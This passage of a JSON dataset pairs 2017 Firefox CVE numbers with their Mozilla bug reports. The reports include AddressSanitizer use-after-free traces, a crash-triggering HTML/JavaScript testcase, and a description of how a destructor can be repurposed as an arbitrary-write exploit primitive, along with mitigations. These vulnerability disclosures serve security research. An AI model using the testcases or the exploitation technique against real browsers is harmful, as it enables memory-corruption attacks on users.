/home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #26 0x7fcc5da5719f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #27 0x7fcc5fad1451 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #28 0x7fcc5fc68757 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #29 0x7fcc5fc69ecd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #30 0x7fcc5fc6ad8c in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #31 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #32 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #33 0x7fcc7303182f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsINode.h:1630:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c248003bcc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248003bcd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c248003bce0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c248003bcf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c248003bd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c248003bd10: fa fa fa fa fa fa fa fa fd fd fd fd fd fd[fd]fd 0x0c248003bd20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248003bd30: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 0x0c248003bd40: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c248003bd50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c248003bd60: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==14974==ABORTING"
      }
    ],
    "CVE-2017-7803": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1377426",
        "title": "Other CSP rules ignored when specifying sandbox 'allow-scripts'",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Steps to reproduce: I'm using a CSP rule (provided as a header, not meta tag) on a page or iframe, where the page contains a script, as follows: Content-Security-Policy: sandbox allow-scripts; script-src 'none'; I tested this in Firefox 54 and the 55 beta on Linux 64 bit. Actual results: The script executes. Expected results: The script should not execute. If you remove the sandbox flag entirely from the CSP rule the script is blocked by the script-src 'none' rule. If you swap the identical sandbox rule to the iframe (if using an iframe) as an attribute on the iframe HTML (rather than via CSP) then the script is correctly blocked. My expectation would be for the behaviour here to be the same regardless of how you specify the sandboxing. The example may seem contradictory (to specify allow-scripts to only then block all scripts) but I actually noticed this when attempting to both sandbox and limit scripts to a particular domain (rather than block off all scripts) but noticed that any script was being allowed through whenever the sandbox rule was present via CSP. The scope of this issue may actually be wider than only allowing through scripts. I've attached a zip that should hopefully illustrate the basic issue (it includes a node/npm http server wrapper for convenience)."
      }
    ],
    "CVE-2017-7804": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1372849",
        "title": "WindowsDllDetourPatcher Destructor Exploit Primitive",
        "description": "WindowsDllDetourPatcher Destructor Exploit Primitive The destructor function for the WindowsDllDetourPatcher class can be re-purposed by an attacker during the exploitation of a memory corruption exploit to force attacker controlled data to be written to an attacker controlled location in memory. Furthermore the destructor function will modify the protection of the memory being written-to, to be writable, before reverting it back to the original protection. This allows an attacker to write arbitrary code to an existing code section before executing it. This issue was found as part of a security review and a working exploit using this technique was developed against FF 52.0 64-Bit on Windows 10.0.15063 (See magic_selfrando_pdatascan1.html in https://bugzilla.mozilla.org/show_bug.cgi?id=1371002). The purpose of the ~WindowsDllDetourPatcher function is to remove existing hooks in place by overwriting the destination pointer from the \"JMP pointer\" (x86) or \"MOV R11, pointer; JMP R11\" (x64) code bytes previously written by CreateTrampoline back to the address of the trampoline, which effectively removes the hook. The mHookPage member variable is a pointer to a buffer that holds several items for every hook that has been added; including a pointer to the original location where the hook was inserted and the trampoline code itself. An attacker with a read/write primitive can discover the location of the mozilla::internal::WindowsDllDetourPatcher::~WindowsDllDetourPatcher function and modify an existing object in heap memory in order to change a vftable entry to allow the ~WindowsDllDetourPatcher function to be called. When ~WindowsDllDetourPatcher is called, it will use member variables stored in the corrupted object and thus the attacker can control the mHookPage and mCurHooks member variables. Note: This issue is separate from https://bugzilla.mozilla.org/show_bug.cgi?id=1344034 as the attacker can set the mHookPage pointer to point to a RW buffer of their choosing. No existing hooks will be in place (as we forge a new WindowsDllDetourPatcher instance) so this buffer never needs to be executable. The attacker can then specify a target location to write to (for example a location in a RX .text section is a good candidate). The data written is an address within the mHookPage buffer (what would be the location of the trampoline code). As the attacker can control this address, the attacker can choose an arbitrary low byte when setting the address in order to force a byte of attacker controlled data to be written to the target address. This operation can be repeated multiple times to allow an arbitrary sequence of bytes to be written. The above technique can be used during any memory corruption exploit where an attacker has a read/write primitive. In order to harden the ~WindowsDllDetourPatcher function from being re-purposed by an attacker, several options are available: 1. Encode the origBytes pointers held in the mHookPage buffer using a secure technique like EncodePointer/DecodePointer (which use a secret held in the kernel to avoid an attacker leaking it). Note: This API is available on XPSP2 and up. 2. Ensure the byte(s) preceding the location being written to are the expected ones. As the write replaces the dest pointer for a jmp, we can always expect the preceding byte on x86 to be 0xE9 for a \"JMP ptr\" instruction and on x64 it can be expected to be 0x49, 0xBB for a \"MOV R11, ptr; JMP R11\" sequence. If the expected bytes are not found the process should __fastfail. 3. Enable CFG as ~WindowsDllDetourPatcher would not be an indirect call target as the class (or the destructor) is not virtual, so methods are called directly and not indirectly via a vftable. This would prevent an attacker calling the destructor via a corrupted object. 4. Enable immutable code pages on systems that support it, e.g. on Windows 10, this is available in the form of Arbitrary Code Guard (ACG). However this is a non trivial change which will probably require out of process JIT engine, out of process hooking and so on. Options 1 and 2 are the best short term solutions, with 3 the best mid term and 4 the best long term solution."
      }
    ],
    "CVE-2017-7805": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1377618",
        "title": "Potential UAF in TLS 1.2 server when verifying client authentication",
        "description": "This is a regression caused by Bug 1179338, but I only noticed it when I made some changes to the sslBuffer functions. In TLS 1.2, handshake hashes are calculated at the time they are needed. The handshake hashes are tweaked to include a pointer to the message buffer in the field pointer_to_hash_input: https://searchfox.org/nss/rev/b5e2bb64574eefa20a9143d908bd4e09a125070e/lib/ssl/ssl3con.c#11668 This is necessary because the hashes need to cover the previous handshake message, but not the current message. Later in the same function, the saved transcript is updated with the current message. ssl3_UpdateHandshakeHashes() is called to add the current handshake message. For TLS 1.2, this means appending those to ss->ssl3.hs.messages, which is an sslBuffer. The problem is that if the handshake transcript exceeds the space available in the current buffer, a new buffer will be allocated. This is fairly unlikely, because the buffer is initialized to (MAX_FRAGMENT_LENGTH + 2048), which is 18k. However, if the handshake transcript up and including the client Certificate is almost 18k, then this reallocation will occur when handling the CertificateVerify as the total transcript goes over 18k. The value of pointer_to_hash_input is left pointing at a freed buffer and you get a UAF when the handshake hashes (needed to verify the client's signature) are calculated. I only noticed this because I changed sslBuffer_Grow to start at a lower initial value and it happened. The fix here is pretty simple. I've attached a patch. I plan to land this as part of a bunch of other work, which should hide the change, however that is only on a branch currently and won't merge into NSS proper for some time. Kai, do you think we need to land this in trunk or uplift it anywhere?"
      }
    ],
    "CVE-2017-7806": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1378113",
        "title": "heap-use-after-free in mozilla::layers::ClientLayerManager::DidComposite",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170703081455). It requires the attached 05crab.svg file in the same directory. Attempts to minimise the file were unsuccessful and made the testcase far less reliable. <script> function start() { o1=window.open('05crab.svg','popup41','width=-11,left=7,innerWidth=2621447,resizable'); window.open('data:text/html,<div>','popup31','left=-2,menubar,toolbar'); o1.onresize=fun0; o1.resizeTo(-26618,2); o1.close(); } function fun0() { x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"test\");}catch(e){} } </script> <body onload=\"start()\"></body> ASAN report: ================================================================= ==27239==ERROR: AddressSanitizer: heap-use-after-free on address 0x6140001bb1d8 at pc 0x7f6be0f281b6 bp 0x7ffe4ec3af90 sp 0x7ffe4ec3af88 READ of size 8 at 0x6140001bb1d8 thread T0 (Web Content) #0 0x7f6be0f281b5 in Length /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 #1 0x7f6be0f281b5 in mozilla::layers::ClientLayerManager::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:520 #2 0x7f6be1018c45 in mozilla::layers::CompositorBridgeChild::RecvDidComposite(unsigned long const&, unsigned long const&, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeChild.cpp:525:14 #3 0x7f6be0288415 in mozilla::layers::PCompositorBridgeChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PCompositorBridgeChild.cpp:1443:20 #4 0x7f6bdfb4253e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25 #5 0x7f6bdfb3f354 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17 #6 0x7f6bdfb40fa4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5 #7 0x7f6bdfb41588 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15 #8 0x7f6bded391af in mozilla::SchedulerGroup::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:367:25 #9 0x7f6bded65f48 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1422:14 #10 0x7f6bded6c098 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10 #11 0x7f6bdfb4a1f1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #12 0x7f6bdfaa6be0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #13 0x7f6bdfaa6be0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #14 0x7f6bdfaa6be0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #15 0x7f6be514ca6f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #16 0x7f6be937fa47 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #17 0x7f6bdfaa6be0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #18 0x7f6bdfaa6be0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #19 0x7f6bdfaa6be0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #20 0x7f6be937f4ad in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:711:34 #21 0x4eb813 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #22 0x4eb813 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #23 0x7f6bfbf4c82f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #24 0x41d168 in _start (/home/nils/fuzzer3/firefox/firefox+0x41d168) 0x6140001bb1d8 is located 408 bytes inside of 424-byte region [0x6140001bb040,0x6140001bb1e8) freed by thread T0 (Web Content) here: #0 0x4bb69b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f6be5124384 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/Layers.h:180:3 #2 0x7f6be5124384 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40 #3 0x7f6be5124384 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:395 #4 0x7f6be5124384 in assign_assuming_AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:65 #5 0x7f6be5124384 in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:166 #6 0x7f6be5124384 in mozilla::widget::PuppetWidget::Destroy() /home/worker/workspace/build/src/widget/PuppetWidget.cpp:198 #7 0x7f6be49ff837 in mozilla::dom::TabChild::DestroyWindow() /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:1030:24 #8 0x7f6be4a118c4 in mozilla::dom::TabChild::RecvDestroy() /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:2361:3 #9 0x7f6be018e9ae in mozilla::dom::PBrowserChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBrowserChild.cpp:4248:20 #10 0x7f6be02fb19c in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentChild.cpp:5288:28 #11 0x7f6bdfb4253e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25 #12 0x7f6bdfb3f354 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17 #13 0x7f6bdfb40fa4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5 #14 0x7f6bdfb41588 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15 #15 0x7f6bded391af in mozilla::SchedulerGroup::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:367:25 #16 0x7f6bded65f48 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1422:14 #17 0x7f6bded6c098 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10 #18 0x7f6be4fadc95 in SpinEventLoopUntil<mozilla::ProcessFailureBehavior::ReportToCaller, (lambda at /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:3088:31)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:323:25 #19 0x7f6be4fadc95 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::BodyExtractorBase const*) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:3088 #20 0x7f6be4fcb846 in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext*, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.h:379:13 #21 0x7f6be2be4156 in mozilla::dom::XMLHttpRequestBinding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:783:13 #22 0x7f6be3348b1e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3028:13 #23 0x7f6be9845724 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #24 0x7f6be9845724 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #25 0x7f6be982e54b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #26 0x7f6be982e54b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #27 0x7f6be98152c8 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #28 0x7f6be98458bc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #29 0x7f6be9846212 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #30 0x7f6bea49624e in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:169:12 #31 0x7f6bea45a629 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:359:23 #32 0x7f6bea4763d3 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:481:21 #33 0x7f6bea478da7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:741:12 #34 0x7f6be9845b6c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #35 0x7f6be9845b6c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:452 #36 0x7f6be9846212 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #37 0x7f6bea1bce1b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #38 0x7f6be2dae555 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 previously allocated by thread T0 (Web Content) here: #0 0x4bb9ec in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ecf0d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f6be5128fa2 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f6be5128fa2 in mozilla::widget::PuppetWidget::GetLayerManager(mozilla::layers::PLayerTransactionChild*, mozilla::layers::LayersBackend, nsIWidget::LayerManagerPersistence) /home/worker/workspace/build/src/widget/PuppetWidget.cpp:582 #4 0x7f6be4a02bc1 in mozilla::dom::TabChild::InitRenderingState(mozilla::layers::TextureFactoryIdentifier const&, unsigned long const&, mozilla::layers::CompositorOptions const&, mozilla::layout::PRenderFrameChild*) /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:2633:24 #5 0x7f6be4a0272d in mozilla::dom::TabChild::DoFakeShow(mozilla::layers::TextureFactoryIdentifier const&, unsigned long const&, mozilla::layers::CompositorOptions const&, mozilla::layout::PRenderFrameChild*, mozilla::dom::ShowInfo const&) /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:1130:3 #6 0x7f6be49807d7 in mozilla::dom::ContentChild::ProvideWindowCommon(mozilla::dom::TabChild*, mozIDOMWindowProxy*, bool, unsigned int, bool, bool, bool, nsIURI*, nsAString const&, nsACString const&, bool, bool*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/dom/ipc/ContentChild.cpp:1026:13 #7 0x7f6be49ff4f0 in mozilla::dom::TabChild::ProvideWindow(mozIDOMWindowProxy*, unsigned int, bool, bool, bool, nsIURI*, nsAString const&, nsACString const&, bool, bool*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:1004:16 #8 0x7f6be92eb550 in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:879:24 #9 0x7f6be92f060f in OpenWindow2 /home/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:444:10 #10 0x7f6be92f060f in non-virtual thunk to nsWindowWatcher::OpenWindow2(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsISupports*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:416 #11 0x7f6be164a85a in nsGlobalWindow::OpenInternal(nsAString const&, nsAString const&, nsAString const&, bool, bool, bool, bool, bool, nsIArray*, nsISupports*, nsIDocShellLoadInfo*, bool, nsPIDOMWindowOuter**) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13036:21 #12 0x7f6be1648f6f in OpenJS /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8924:10 #13 0x7f6be1648f6f in nsGlobalWindow::OpenOuter(nsAString const&, nsAString const&, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8886 #14 0x7f6be16493fd in nsGlobalWindow::Open(nsAString const&, nsAString const&, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8895:3 #15 0x7f6be2b1fc22 in mozilla::dom::WindowBinding::open(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:2414:56 #16 0x7f6be2b1e500 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15689:13 #17 0x7f6be9845724 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #18 0x7f6be9845724 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #19 0x7f6be982e54b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #20 0x7f6be982e54b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #21 0x7f6be98152c8 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #22 0x7f6be98458bc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #23 0x7f6be9846212 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #24 0x7f6bea1bce1b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #25 0x7f6be2dae555 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #26 0x7f6be37386fb in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #27 0x7f6be37386fb in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #28 0x7f6be37017b9 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1142:51 #29 0x7f6be3703692 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1314:20 #30 0x7f6be36e37c1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #31 0x7f6be36e6c92 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9 #32 0x7f6be593e94f in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1104:7 #33 0x7f6be888df3a in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7698:21 #34 0x7f6be8889f98 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7496:7 #35 0x7f6be889150f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7393:13 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 in Length Shadow bytes around the buggy address: 0x0c288002f5e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c288002f5f0: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 0x0c288002f600: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c288002f610: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c288002f620: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c288002f630: fd fd fd fd fd fd fd fd fd fd fd[fd]fd fa fa fa 0x0c288002f640: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c288002f650: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c288002f660: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c288002f670: 00 00 00 00 00 00 00 00 07 fa fa fa fa fa fa fa 0x0c288002f680: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==27239==ABORTING"
      }
    ],
    "CVE-2017-7807": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1376459",
        "title": "AppCache issues (served on subpath allowed to set FALLBACK for whole origin, allowed to set on svg/xml)",
